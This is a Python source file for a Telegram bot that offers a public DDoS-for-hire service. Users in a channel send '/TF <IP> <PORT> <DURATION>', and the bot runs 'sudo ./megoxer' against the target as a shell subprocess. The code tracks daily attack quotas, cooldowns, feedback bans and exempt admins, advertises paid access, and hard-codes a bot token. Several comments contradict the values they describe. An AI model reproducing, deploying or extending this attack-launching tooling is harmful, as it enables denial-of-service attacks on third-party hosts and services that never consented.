import os
import telebot
import logging
import asyncio
from datetime import datetime, timedelta, timezone

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Telegram bot token and channel ID
TOKEN = '7475040161:AAH3vzyis8rQ9cMEOkWABR-htX7ved9ux6I'  # Replace with your actual bot token
ADMIN_IDS = [7479349647]  # Added new admin ID
CHANNEL_ID = '-1002439558968'  # Replace with your specific channel or group ID
# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Dictionary to track user attack counts, cooldowns, photo feedbacks, and bans
user_attacks = {}
user_cooldowns = {}
user_photos = {}  # Tracks whether a user has sent a photo as feedback
user_bans = {}  # Tracks user ban status and ban expiry time
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=10))).replace(hour=0, minute=0, second=0, microsecond=0)

# Cooldown duration (in seconds)
COOLDOWN_DURATION = 10  # 5 minutes
BAN_DURATION = timedelta(minutes=1)  
DAILY_ATTACK_LIMIT = 15  # Daily attack limit per user

# List of user IDs exempted from cooldown, limits, and photo requirements
EXEMPTED_USERS = [6768273586, 7479349647]

# Track active attacks
active_attacks = 0  
MAX_ACTIVE_ATTACKS = 2  # Maximum number of running attacks

def reset_daily_counts():
    """Reset the daily attack counts and other data at 12 AM IST."""
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=10)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)


# Function to validate IP address
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# Function to validate port number
def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

# Function to validate duration
def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0

from telebot import types

# 🌟✨ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑪𝒐𝒎𝒎𝒂𝒏𝒅 ✨🌟
@bot.message_handler(commands=['start'])
def start_command(message):
    keyboard = types.InlineKeyboardMarkup()
    join_channel_button = types.InlineKeyboardButton(text="🔗 𝐉𝐎𝐈𝐍 𝐓𝐆 𝐂𝐇𝐀𝐍𝐍𝐄𝐋", url="t.me/+t_GmBHP91YY0ZjVl")
    keyboard.add(join_channel_button)

# PAPA TF_FLASH92
# 🛡️ 『 𝑺𝒕𝒂𝒕𝒖𝒔 𝑪𝒐𝒎𝒎𝒂𝒏𝒅 』🛡️
@bot.message_handler(commands=['status'])
def check_status(message):
    user_id = message.from_user.id
    remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
    cooldown_end = user_cooldowns.get(user_id)
    cooldown_time = max(0, (cooldown_end - datetime.now()).seconds) if cooldown_end else 0
    
    status_message = (
        "🛡️ *⚡ 𝑨𝒕𝒕𝒂𝒄𝒌 𝑺𝒕𝒂𝒕𝒖𝒔 ⚡* 🛡️\n\n"
        f"👤 *𝑼𝒔𝒆𝒓:* {message.from_user.first_name}\n"
        f"🎯 *𝑹𝒆𝒎𝒂𝒊𝒏𝒊𝒏𝒈 𝑨𝒕𝒕𝒂𝒄𝒌𝒔:* {remaining_attacks}\n"
        f"⏳ *𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏 𝑻𝒊𝒎𝒆:* {cooldown_time} seconds left\n"
    )
    
    bot.send_message(message.chat.id, status_message)

# 🔄 『 𝑹𝒆𝒔𝒆𝒕 𝑨𝒕𝒕𝒂𝒄𝒌 𝑳𝒊𝒎𝒊𝒕𝒔 』🔄
@bot.message_handler(commands=['reset_TF'])
def reset_attack_limit(message):
    owner_id = 123456789  # Replace with the actual owner ID
    if message.from_user.id != owner_id:
        bot.send_message(message.chat.id, "❌ You are not authorized to use this command!")
        return
    
    user_attacks.clear()
    bot.send_message(
        message.chat.id, 
        "✅ *🌟 𝑨𝒍𝒍 𝑫𝒂𝒊𝒍𝒚 𝑨𝒕𝒕𝒂𝒄𝒌 𝑳𝒊𝒎𝒊𝒕𝒔 𝑹𝒆𝒔𝒆𝒕! 🌟* 🔄\n\n"
        "🚀 𝑼𝒔𝒆𝒓𝒔 𝒄𝒂𝒏 𝒏𝒐𝒘 𝒔𝒕𝒂𝒓𝒕 𝒇𝒓𝒆𝒔𝒉 𝒂𝒕𝒕𝒂𝒄𝒌𝒔."
    )

# Handler for photos sent by users (feedback received)
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    user_photos[user_id] = True  # Mark that the user has sent a photo as feedback
    username = message.from_user.username or message.from_user.first_name
    
    # Confirmation message for user
    bot.send_message(
        message.chat.id,
        f"✅ 𝙃𝙞 📸 𝙁𝙀𝙀𝘿𝘽𝙖𝘾𝙆 𝙍𝙚𝘾𝙀𝙄𝙑𝙚𝘿\n━━━━━━━━━━━━━━━━━━━━━━━\n 𝙁𝙍𝙤𝙈 𝙐𝙎𝙚𝙍 :- @{username} ✅"
    )
    
    # Forward the photo to all admins
    for admin_id in ADMIN_IDS:
        bot.forward_message(admin_id, message.chat.id, message.message_id)
        bot.send_message(admin_id, f"✅ 𝙃𝙞 📸 𝙁𝙀𝙀𝘿𝘽𝙖𝘾𝙆 𝙍𝙚𝘾𝙀𝙄𝙑𝙚𝘿\n━━━━━━━━━━━━━━━━━━━━━━━\n 𝙁𝙍𝙤𝙈 𝙐𝙎𝙚𝙍 :- @{username} ({user_id})")


@bot.message_handler(commands=['TF'])
def TF_command(message):
    global user_attacks, user_cooldowns, user_photos, user_bans
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"

    # Ensure the bot only works in the specified channel or group
    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(message.chat.id, " ⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 ⚠️⚠️ \n\n[ 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : @TG_FLASH92 ( TUMHARE_PAPA ) | ]\n\nPAID AVAILABLE DM:- @TG_FLASH92")
        return

    # Reset counts daily
    reset_daily_counts()

    # Check if the user is banned
    if user_id in user_bans:
        ban_expiry = user_bans[user_id]
        if datetime.now() < ban_expiry:
            remaining_ban_time = (ban_expiry - datetime.now()).total_seconds()
            minutes, seconds = divmod(remaining_ban_time, 10)
            bot.send_message(
                message.chat.id,
                f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣𝙜 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️"
            )
            return
        else:
            del user_bans[user_id]  # Remove ban after expiry

# Check if the number of running attacks is at the limit
    if active_attacks >= MAX_ACTIVE_ATTACKS:
        bot.send_message(
            message.chat.id,
            "⚠️𝗕𝗛𝗔𝗜 𝗦𝗔𝗕𝗥 𝗥𝗔𝗞𝗛𝗢! 𝗔𝗕𝗛𝗜 𝟮 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗛𝗔𝗟 𝗥𝗔𝗛𝗘 𝗛𝗔𝗜! 🚀, \n\n1 ATTACK FINISH HONE DE."
        )
        return

    # Check if user is exempted from cooldowns, limits, and feedback requirements
    if user_id not in EXEMPTED_USERS:
        # Check if user is in cooldown
        if user_id in user_cooldowns:
            cooldown_time = user_cooldowns[user_id]
            if datetime.now() < cooldown_time:
                remaining_time = (cooldown_time - datetime.now()).seconds
                bot.send_message(
                    message.chat.id,
                    f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {remaining_time // 10} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {remaining_time % 10} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 ⚠️⚠️ "
                )
                return

        # Check attack count
        if user_id not in user_attacks:
            user_attacks[user_id] = 0

        if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
            bot.send_message(
                message.chat.id,
                f"𝙃𝙞 {message.from_user.first_name}, BHAI APKI AJ KI ATTACK LIMIT HOGYI HAI AB DIRECT KAL ANA  ✌️"
            )
            return

        # Check if the user has provided feedback after the last attack
        if user_id in user_attacks and user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
            user_bans[user_id] = datetime.now() + BAN_DURATION  # Ban user for 2 hours
            bot.send_message(
                message.chat.id,
                f"𝙃𝙞 {message.from_user.first_name}, ⚠️💀 DEKH BHAI TU NE FEEDBACK NHI DIYA ISLIYE.\n\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 10 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️"
            )
            return

    # Split the command to get parameters
    try:
        args = message.text.split()[1:]  # Skip the command itself
        logging.info(f"Received arguments: {args}")

        if len(args) != 3:
            raise ValueError("TF_FLASH92 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n⚙ USE THIS 👇⬇️\n/TF <IP> <PORT> <DURATION>")

        target_ip, target_port, user_duration = args

        # Validate inputs
        if not is_valid_ip(target_ip):
            raise ValueError("Invalid IP address.")
        if not is_valid_port(target_port):
            raise ValueError("Invalid port number.")
        if not is_valid_duration(user_duration):
            raise ValueError("Invalid duration. Must be a positive integer.")

        # Increment attack count for non-exempted users
        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] += 1
            user_photos[user_id] = False  # Reset photo feedback requirement

        # Set cooldown for non-exempted users
        if user_id not in EXEMPTED_USERS:
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        # Notify that the attack will run for the default duration of 150 seconds, but display the input duration
        default_duration = 150
        
        remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
        
        user_info = message.from_user
        username = user_info.username if user_info.username else user_info.first_name
        bot.send_message(
        message.chat.id,
            f"🚀𝙃𝙞 {message.from_user.first_name}, \n𝘼𝙩𝙩𝙖𝙘𝙠 ??𝙩𝙖𝙧𝙩𝙚𝙙 𝙤𝙣 {target_ip} : {target_port} 𝙛𝙤𝙧 {default_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 ] \n\n🖤𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾𝙆𝙎 𝙁𝙊𝙍 𝙏𝙊𝘿𝘼𝙔🖤 :- {remaining_attacks}\n\n★[𝔸𝕋𝕋𝔸ℂ𝕂𝔼ℝ 𝙉𝘼𝙈𝙀]★:- @{username}\n\n❗️❗️ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 ❗️❗️"
        )

        # Log the attack started message
        logging.info(f"Attack started by {user_name}:sudo ./megoxer {target_ip} {target_port} {default_duration} ")

        # Run the attack command with the default duration and pass the user-provided duration for the finish message
        asyncio.run(run_attack_command_async(target_ip, int(target_port), default_duration, user_duration, user_name))

    except Exception as e:
        bot.send_message(message.chat.id, str(e))

async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
    try:
        command = f"sudo ./megoxer {target_ip} {target_port} {duration} "
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()
        bot.send_message(CHANNEL_ID, f"🌊ѦƮṪ𝘼₡𝘒 ₡𝓞𝑀ℙLỄṪỄĎ🌊\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target_ip}\n𝐏𝐎𝐑𝐓 -> {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 TF-FLASH™")
    except Exception as e:
        bot.send_message(CHANNEL_ID, f"Error running attack command: {e}")

# Start the bot
if __name__ == "__main__":
    logging.info("Bot is starting...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}")
